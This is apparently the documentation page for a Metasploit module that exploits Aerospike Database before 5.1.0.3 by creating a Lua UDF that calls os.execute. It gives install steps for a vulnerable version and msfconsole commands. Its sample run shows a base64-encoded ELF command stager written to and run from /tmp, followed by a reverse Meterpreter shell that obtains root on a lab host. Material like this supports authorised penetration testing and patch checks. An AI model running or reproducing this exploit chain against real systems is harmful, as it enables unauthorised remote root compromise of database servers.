## Vulnerable Application

Aerospike Database versions before 5.1.0.3 permitted
user-defined functions (UDF) to call the `os.execute`
Lua function.

This module creates a UDF utilising this function to
execute arbitrary operating system commands with the
privileges of the user running the Aerospike service.

This module does not support authentication; however
Aerospike Database Community Edition does not enable
authentication by default.

This module has been tested successfully on Ubuntu
with Aerospike Database Community Edition versions
4.9.0.5, 4.9.0.11 and 5.0.0.10.


## Verification Steps

Download a vulnerable version of Aerospike Database Community Edition from:

* https://www.aerospike.com/artifacts/aerospike-server-community/

Decompress the compressed `.tgz` software installer archive file:

```
$ gunzip aerospike-server-community-5.0.0.10-ubuntu18.04.tgz
$ tar xvf aerospike-server-community-5.0.0.10-ubuntu18.04.tar
```

Install:

```
$ cd aerospike-server-community-5.0.0.10-ubuntu18.04
$ sudo ./asinstall
```

Start the `aerospike` service:

```
$ sudo service aerospike start
```

1. Start msfconsole
1. Do: `use exploit/linux/misc/aerospike_database_udf_cmd_exec`
1. Do: `set RHOSTS [IP]`
1. Do: `set target [target]`
1. Do: `set payload [payload]`
1. Do: `set LHOST [IP]`
1. Do: `exploit`


## Options

### UDF_DIRECTORY

Directory where Lua UDF files are stored (Default: `/opt/aerospike/usr/udf/lua/`)


## Scenarios

### Aerospike Database Community Edition version 5.0.0.10 on Ubuntu 20.04 (x64)

```
msf6 > use exploit/linux/misc/aerospike_database_udf_cmd_exec 
[*] Using configured payload cmd/unix/reverse
msf6 exploit(linux/misc/aerospike_database_udf_cmd_exec) > set rhost 172.16.191.208
rhost => 172.16.191.208
msf6 exploit(linux/misc/aerospike_database_udf_cmd_exec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Unix Command
   1   Linux (Dropper)


msf6 exploit(linux/misc/aerospike_database_udf_cmd_exec) > set target 1
target => 1
msf6 exploit(linux/misc/aerospike_database_udf_cmd_exec) > set payload
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/misc/aerospike_database_udf_cmd_exec) > set verbose true
verbose => true
msf6 exploit(linux/misc/aerospike_database_udf_cmd_exec) > set lhost 172.16.191.165 
lhost => 172.16.191.165
msf6 exploit(linux/misc/aerospike_database_udf_cmd_exec) > run

[*] Started reverse TCP handler on 172.16.191.165:4444 
[*] 172.16.191.208:3000 - Executing automatic check (disable AutoCheck to override)
[*] 172.16.191.208:3000 - Aerospike Database version 5.0.0.10
[+] 172.16.191.208:3000 - The target appears to be vulnerable.
[*] 172.16.191.208:3000 - Sending payload (123 bytes) ...
[*] 172.16.191.208:3000 - Generated command stager: ["echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1torBC/pWgCABFcieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/zqOkT.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/qXNWk' < '/tmp/zqOkT.b64' ; chmod +x '/tmp/qXNWk' ; '/tmp/qXNWk' & sleep 2 ; rm -f '/tmp/qXNWk' ; rm -f '/tmp/zqOkT.b64'"]
[*] 172.16.191.208:3000 - Creating UDF 'DpdWZwYHiuZvjods.lua' ...
[*] Transmitting intermediate stager...(106 bytes)
[*] Sending stage (976712 bytes) to 172.16.191.208
[*] 172.16.191.208:3000 - UDF 'DpdWZwYHiuZvjods.lua' removed successfully
[*] Meterpreter session 1 opened (172.16.191.165:4444 -> 172.16.191.208:55852) at 2020-12-05 09:09:27 -0500
[*] Transmitting intermediate stager...(106 bytes)
[*] 172.16.191.208:3000 - Command Stager progress - 100.00% done (773/773 bytes)

meterpreter > getuid
Server username: root @ ubuntu (uid=0, gid=0, euid=0, egid=0)
meterpreter > sysinfo
Computer     : ubuntu.local
OS           : Ubuntu 20.04 (Linux 5.4.0-53-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > 
```

